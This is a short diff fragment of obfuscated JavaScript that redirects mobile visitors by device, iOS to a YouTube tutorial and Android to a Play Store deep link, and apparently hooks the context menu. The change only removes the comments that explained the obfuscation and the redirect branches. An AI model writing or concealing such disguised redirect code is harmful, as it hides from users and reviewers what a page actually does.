@@ -1,5 +1,4 @@
 (function(){
-    // ===[ Table de correspondances obfusquée ]===
     var _0x2a3b = {
         '0x0': 'addEventListener',
         '0x1': 'contextmenu',
@@ -79,10 +78,8 @@
     // ===[ Redirection conditionnelle ]===
     if(_0r1s2() && _0b9c0d()){
         if(_0a9b0c()){
-            // iOS : redirection vers le tutoriel YouTube
             window[_0x4c1d('0xd')][_0x4c1d('0xe')] = _0x4c1d('0x17');
         } else {
-            // Android (ou autre) : deep link Play Store + fallback
             window[_0x4c1d('0xd')][_0x4c1d('0xe')] = _0x4c1d('0x14');
             setTimeout(function(){
                 if(document[_0x4c1d('0xb')] && document[_0x4c1d('0xb')][_0x4c1d('0xc')] !== ''){
